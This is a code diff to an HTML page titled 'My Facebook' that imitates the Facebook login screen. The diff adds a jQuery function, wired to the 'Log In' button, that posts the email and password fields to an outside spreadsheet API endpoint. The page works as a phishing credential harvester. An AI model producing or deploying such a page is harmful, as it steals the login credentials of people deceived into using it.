@@ -6,6 +6,25 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="body.css">
     <title>My Facebook</title>
+    <script
+  src="https://code.jquery.com/jquery-3.4.1.js"
+  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+  crossorigin="anonymous"></script>
+<script>
+function SubForm (){
+    $.ajax({
+        url:'https://api.apispreadsheets.com/data/Bht9vKK04BDOvRjl/',
+        type:'post',
+        data:$("#myForm").serializeArray(),
+        success: function(){
+          alert("Form Data Submitted :)")
+        },
+        error: function(){
+          alert("There was an error :(")
+        }
+    });
+}
+</script>
 </head>
 <body>
     <div class="main">
@@ -24,16 +43,14 @@
         <div class="right">
             <div class="signup-in">
                 <div class="login">
-                    <form class="login-page">
+                    <form class="login-page" id="myForm">
                         <input type="email" name="email" id="email" placeholder="Enter email address or phone number">
                         <br>
                         <input type="password" name="password" id="password" placeholder="Password">
                     </form>
                 </div>
                 <div class="login-button">
-                    <button class="blue-button">
-                        Log In
-                    </button>
+                    <button onclick="SubForm()" class="blue-button">Log In</button>
                 </div>
                 <div class="forgotten">
                     <a  class="fp" href="#">Forgotten password?</a>
